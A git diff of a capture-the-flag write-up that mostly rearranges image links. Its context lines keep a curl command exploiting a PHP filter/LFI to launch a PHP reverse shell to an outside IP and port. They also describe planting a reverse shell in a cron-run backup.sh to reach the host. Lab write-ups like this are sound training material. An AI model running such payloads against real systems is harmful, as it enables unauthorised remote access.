@@ -54,8 +54,6 @@ Execute `ls%20..%2F` on the cmd param and you found out that there is the second
 
 ## Reverse shell
 
-![image](https://github.com/Roqlane/writeups/assets/78229498/a5fe8bbc-12a5-4de9-9cca-f82e54845521)
-
 `curl "http://10.10.17.47/?view=php://filter/$FILTERS/resource=cat&cmd=php%20-r%20'%24sock%3Dfsockopen(%2210.9.164.243%22%2C6969)%3Bexec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B'" --output result`
 
 ![image](https://github.com/Roqlane/writeups/assets/78229498/2fe4aa6a-e835-4bd8-aedd-88a0c4fc328e)
@@ -76,10 +74,10 @@ If I remember well, we are in a docker container, let's use this: https://github
 
 ![image](https://github.com/Roqlane/writeups/assets/78229498/eeec3090-f522-474c-a816-29f5d9ca38c3)
 
+![image](https://github.com/Roqlane/writeups/assets/78229498/38aba1ee-a112-4557-bf46-3ad68b5986e4)
+
 ![image](https://github.com/Roqlane/writeups/assets/78229498/a46bb9aa-97e2-4d04-8069-d0f6925e9a3a)
 
-
-![image](https://github.com/Roqlane/writeups/assets/78229498/38aba1ee-a112-4557-bf46-3ad68b5986e4)
 
 Well I passed a lot of time searching for docker escape, only to find out that the backup.sh file is executed as a cron job......
 That surely means that the host is executing the file, so if we add a reverse shell to the file, we could access the host system.
